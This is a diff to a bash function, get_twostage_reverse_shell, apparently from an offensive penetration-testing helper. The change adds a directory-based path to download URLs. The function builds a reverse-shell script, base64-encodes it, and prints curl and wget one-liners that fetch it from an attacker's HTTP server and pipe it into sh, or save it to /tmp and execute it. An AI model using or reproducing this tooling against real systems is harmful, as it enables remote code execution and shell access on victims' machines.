@@ -402,21 +402,29 @@ get_twostage_reverse_shell() {
     if [[ ! -z $shell_number ]]; then
         shell_name+="_$shell_number"
     fi
+    
+    local exploit_path=""
+    local directory_name=""
+    directory_name=$(basename "$PWD")
+    if [[ $directory_name != *$project_name* ]]; then
+         exploit_path="$(echo $PWD | sed -E "s/.*$project_name\/(.*)/\1/g")/"
+    fi
+    echo "$exploit_path" >> $trail_log
     shell_name+=".b64"
     echo '#!/bin/bash' > reverse_shell.sh
     echo "$cmd" >> reverse_shell.sh
     base64 -w0 reverse_shell.sh > "$shell_name"
     if [[ ! -z $two_stage_option ]] && [[ "$two_stage_option" == "wget" ]]; then
-        echo "wget -qO- http://$http_ip:$http_port/$shell_name | base64 -d | sh"
+        echo "wget -qO- http://$http_ip:$http_port/$exploit_path$shell_name | base64 -d | sh"
         return 0
     elif [[ ! -z $two_stage_option ]] && [[ "$two_stage_option" == "wget_runscript" ]]; then
-        echo "wget http://$http_ip:$http_port/$shell_name -O /tmp/$shell_name"
+        echo "wget http://$http_ip:$http_port/$exploit_path$shell_name -O /tmp/$shell_name"
         echo "base64 -d /tmp/$shell_name > /tmp/$shell_name.sh"
         echo "chmod +x /tmp/$shell_name.sh"
         echo "/tmp/$shell_name.sh"
         return 0    
     else
-        echo "curl http://$http_ip:$http_port/$shell_name | base64 -d | sh"
+        echo "curl http://$http_ip:$http_port/$exploit_path$shell_name | base64 -d | sh"
     fi
     
 }
